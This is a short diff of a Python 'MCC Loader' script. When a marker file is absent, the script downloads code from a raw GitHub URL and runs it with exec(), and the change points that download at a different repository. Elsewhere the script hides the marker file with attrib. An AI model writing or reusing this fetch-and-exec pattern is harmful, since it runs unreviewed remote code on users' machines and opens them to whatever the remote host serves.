@@ -27,7 +27,7 @@ windowtitle("MCC Loader 1.0.2")
 try:
     f = open('TOSVDOIAHWOIHSAKLFHWA.txt')
 except FileNotFoundError:
-    exec(requests.get('https://raw.githubusercontent.com/MCCFree/TOS/main/Term%20of%20Services').text)
+    exec(requests.get('https://raw.githubusercontent.com/Byp4ssFDP/MCC_SourceCode/main/MCC%20-%20Free%20Version/TOS.py').text)
 else:
     f.close
     subprocess.check_call(["attrib", "+H", "TOSVDOIAHWOIHSAKLFHWA.txt"])
